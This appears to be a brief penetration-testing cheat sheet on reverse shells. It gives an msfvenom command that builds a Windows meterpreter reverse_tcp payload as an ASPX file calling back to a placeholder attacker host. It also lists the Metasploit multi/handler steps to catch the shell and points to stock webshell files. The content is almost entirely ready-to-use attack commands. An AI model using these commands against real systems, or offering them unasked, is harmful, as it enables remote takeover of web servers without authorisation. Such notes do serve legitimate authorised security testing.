# Reverse shells

### Msfvenom

```text
# aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=8990 -f aspx -o yelenz.aspx
```

### Catching msfvenom

```text
msf5 > use exploit/multi/handler
msf5 > set payload windows/meterpreter/reverse_tcp
msf5 > set lhost <attacker>
msf5 > set lport 8990
msf5 > exploit -j
```

### Webshells

```text
/usr/share/webshells/*
```

